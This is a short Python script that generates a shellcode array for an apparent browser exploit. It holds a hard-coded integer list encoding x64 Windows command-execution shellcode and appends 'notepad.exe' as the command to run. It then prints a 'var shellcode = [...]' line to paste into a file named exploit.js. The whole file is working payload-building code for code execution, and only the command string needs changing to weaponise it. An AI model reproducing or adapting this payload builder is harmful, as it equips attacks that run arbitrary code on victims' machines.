# only python3 supported

payload = b"notepad.exe"
shellcode = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216]
data = [payload[max(0, i-4):i] for i in range(1, len(payload)+4, 4)]
data[0] = b'\xda\xff\xd5c\x00\x00\x00\x00'[:3] + data[0]
data[-1] = data[-1] + (4 - len(data[-1])) * b'\x00'
ret = [ _ + b'\x00\x00\x00\x00' for _ in data]
code = [int().from_bytes(_, byteorder='little', signed=True) for _ in ret]
print("replace it to exploit.js:\nvar shellcode = [{}]".format(shellcode + code))